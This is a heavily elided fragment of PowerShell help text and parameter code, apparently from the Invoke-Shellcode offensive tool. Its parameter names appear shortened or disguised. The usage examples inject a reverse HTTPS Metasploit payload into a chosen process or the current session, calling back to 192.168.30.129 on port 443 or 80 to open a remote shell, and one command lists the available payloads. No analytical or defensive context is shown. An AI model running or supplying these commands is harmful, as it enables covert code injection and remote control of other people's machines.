...
Lists all of the available Metasploit Pls that Invoke-Shellcode supports
...
C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Pl r_https -H 192.168.30.129 -O 443 -Verbose
...
C:\PS> Invoke-Shellcode -Pl r_https -H 192.168.30.129 -O 80
...
C:\PS> Invoke-Shellcode -ListMetasploitPls
...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    ...
    {
        $AvailablePls = (Get-Command Invoke-Shellcode).Parameters['Pl'].Attributes |
